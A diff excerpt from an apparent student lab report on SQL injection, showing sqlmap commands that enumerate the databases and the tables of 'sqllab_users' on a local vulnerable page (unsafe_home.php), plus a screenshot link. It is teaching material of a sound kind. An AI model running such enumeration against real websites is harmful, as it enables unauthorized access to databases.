@@ -74,4 +74,11 @@ Question 1: Use sqlmap to get information about all available databases Answer 1
 ```sh
 python sqlmap.py -u "http://localhost:3128/unsafe_home.php?username=1" --dbs
 ``` 
+- From there we know that the two tables of this website are sqllab_users and information_schema
 
+<img width="1000" alt="Screenshot" src="https://github.com/hoangphung123/SECLAB1/blob/master/img/Database.png?raw=true"><br>
+
+- Next we run the following command to know how many tables there are in the database
+```sh
+python sqlmap.py -u "http://localhost:3128/unsafe_home.php?username=1" -D sqllab_users --tables
+``` 
